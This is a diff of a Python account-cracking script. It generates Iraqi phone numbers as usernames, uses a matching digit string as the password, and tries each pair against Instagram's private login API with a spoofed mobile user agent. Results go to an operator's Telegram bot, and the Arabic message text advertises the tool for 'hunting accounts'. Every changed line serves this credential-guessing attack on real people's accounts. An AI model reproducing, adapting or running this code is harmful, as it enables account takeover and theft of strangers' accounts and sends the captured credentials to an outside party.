@@ -85,8 +85,8 @@ else:
         user = '0987654321'
         while True:
             us = str(''.join((random.choice(user) for i in range(7))))
-            username = '+964780' + us
-            password = '0780' + us
+            username = '+964751' + us
+            password = '0751' + us
             url = 'https://i.instagram.com/api/v1/accounts/login/'
             headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
              'Accept':'*/*', 
@@ -116,7 +116,7 @@ else:
             elif '"message":"challenge_required","challenge"' in req_login.text:
                 print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
             else:
-                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  روح نام من اصيدلك حساب اگلك 😂\n  ✅ [{zz}] \n------------------------------------------\n  ❌[{aa}]  ( {username} ) \n Dev →  @SQ21C")
+                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  اداة M.S.A لصيد الحسابات   @SQ21C\n  ✅ [{zz}] \n------------------------------------------\n  ❌[{aa}]  ( {username} ) \n Dev →  @SQ21C")
                 print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                 aa += 1
 
